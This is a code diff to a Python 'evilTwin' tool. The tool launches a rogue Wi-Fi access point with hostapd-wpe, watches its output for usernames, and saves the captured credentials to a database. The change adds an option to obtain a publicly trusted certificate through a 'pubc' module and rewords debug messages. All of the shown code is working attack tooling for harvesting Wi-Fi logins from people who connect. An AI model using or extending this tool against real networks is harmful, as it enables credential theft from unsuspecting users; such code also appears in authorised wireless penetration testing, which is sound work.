@@ -8,6 +8,7 @@ try:
 	import os, sys, time, datetime, signal, threading
 	from subprocess import Popen, PIPE
 	from theme import *
+	import pubc
 except Exception as e:
 	print('\n [!] Error ' +str(e))
 
@@ -24,7 +25,7 @@ except Exception as e:
 
 class evilTwin(threading.Thread):
 	def __init__(self, interface, ssid, channel, macaddress, \
-	 certname, band, server_cert, private_key,\
+	 certname, public,  band, server_cert, private_key,\
 	 country, state, city, company, ou, email, debug):
 		threading.Thread.__init__(self)
 		self.setDaemon(0) # Creates thread in non-daemon mode
@@ -34,6 +35,7 @@ class evilTwin(threading.Thread):
 		self.ssid = ssid
 		self.channel = channel
 		self.certname = certname
+		self.public = public
 		self.band = band
 		self.country = country
 		self.state = state
@@ -51,7 +53,16 @@ class evilTwin(threading.Thread):
 
 	def run(self):
 		self.datafolders_check()
-		self.sslCert(self.country, self.state, self.city, self.company, self.ou, self.certname, self.email)
+
+		if not self.public:
+			self.sslCert(self.country, self.state, self.city, self.company, self.ou, self.certname, self.email)
+		else:
+			publicCert = pubc.crtb(self.certname, self.email, self.debug)
+			publicCert.start()
+			publicCert.join()
+			time.sleep(5)
+			print('\n')
+		
 		self.dependency_check()
 		self.hostapd_config()
 		self.sanity_check()
@@ -59,10 +70,10 @@ class evilTwin(threading.Thread):
 
 		p1 = Popen(['hostapd-wpe', 'data/hostapd-wpe/hostapd-wpe.conf'], stdout=PIPE)
 		if not self.debug:
-			print('\n [i] Real-time logs below:(Press Ctrl-C to quit)\n')
+			print('\n [i] Real-time logging below:(Press Ctrl-C to quit)\n')
 		else:
-			print('\n'+red('!')+'Warning Debug Mode enabled, credentials will not be saved to the database')
-			print(' [i] Real-time logs below:(Press Ctrl-C to quit)\n')
+			print('\n'+white('Debug')+'Debug Mode enabled, credentials will not be saved to the database')
+			print(white('Debug')+'Hostapd-wpe real-time logging below:(Press Ctrl-C to quit)\n')
 		for line in iter(p1.stdout.readline, ''):
 			if not self.debug:
 				if "username" in line:
@@ -101,7 +112,7 @@ class evilTwin(threading.Thread):
 		if p1.communicate()[0]:
 			p2 = Popen(["dpkg-query", "-W", "-f", "${version}", "hostapd-wpe"], stdout=PIPE)
 			if self.debug:
-				print(blue('i')+'Running hostapd-wpe %s' % (p2.communicate()[0]))
+				print(white('Debug')+'Running hostapd-wpe %s' % (p2.communicate()[0]))
 		else:
 			print(blue('i')+'Installing hostapd-wpe ...')
 			p3 = Popen(['apt-get install -y hostapd-wpe'], shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
